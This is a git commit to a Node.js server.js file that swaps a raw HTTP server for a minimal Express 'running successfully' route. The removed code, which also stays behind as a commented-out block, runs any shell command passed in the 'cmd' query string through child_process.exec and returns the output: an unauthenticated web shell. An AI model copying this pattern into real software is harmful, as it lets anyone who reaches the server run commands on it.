7fc7bb130bd9b9a78a019ca6e2f9b28044221aeb
Raunak <54508518+TROUBLE-1@users.noreply.github.com>
2025-04-04 19:17:11 +0530

    Update server.js

--- server.js
+++ server.js
@@ -4,30 +4,45 @@ const { exec } = require('child_process');
 
 const PORT = 3000;
 
-http.createServer((req, res) => {
-  const queryObject = url.parse(req.url, true).query;
+const express = require('express');
+const app = express();
+const port = process.env.PORT || 3000;
 
-  if (queryObject.cmd) {
-    exec(queryObject.cmd, (error, stdout, stderr) => {
-      res.writeHead(200, { 'Content-Type': 'text/plain' });
-
-      if (error) {
-        res.end(`Error: ${error.message}`);
-        return;
-      }
-
-      if (stderr) {
-        res.end(`Stderr: ${stderr}`);
-        return;
-      }
-
-      res.end(`Output:\n${stdout}`);
-    });
-  } else {
-    res.writeHead(200, { 'Content-Type': 'text/plain' });
-    res.end('this is new\nUsage: /?cmd=<your-command>\nExample: /?cmd=ls');
-  }
-
-}).listen(PORT, () => {
-  console.log(`Server running on http://localhost:${PORT}`);
+app.get('/', (req, res) => {
+  res.send('✅ Node.js application is running successfully!');
 });
+
+
+app.listen(port, () => {
+  console.log(`🚀 Server is listening on http://localhost:${port}`);
+});
+
+
+
+// http.createServer((req, res) => {
+//   const queryObject = url.parse(req.url, true).query;
+
+//   if (queryObject.cmd) {
+//     exec(queryObject.cmd, (error, stdout, stderr) => {
+//       res.writeHead(200, { 'Content-Type': 'text/plain' });
+
+//       if (error) {
+//         res.end(`Error: ${error.message}`);
+//         return;
+//       }
+
+//       if (stderr) {
+//         res.end(`Stderr: ${stderr}`);
+//         return;
+//       }
+
+//       res.end(`Output:\n${stdout}`);
+//     });
+//   } else {
+//     res.writeHead(200, { 'Content-Type': 'text/plain' });
+//     res.end('Usage: /?cmd=<your-command>\nExample: /?cmd=ls');
+//   }
+
+// }).listen(PORT, () => {
+//   console.log(`Server running on http://localhost:${PORT}`);
+// });
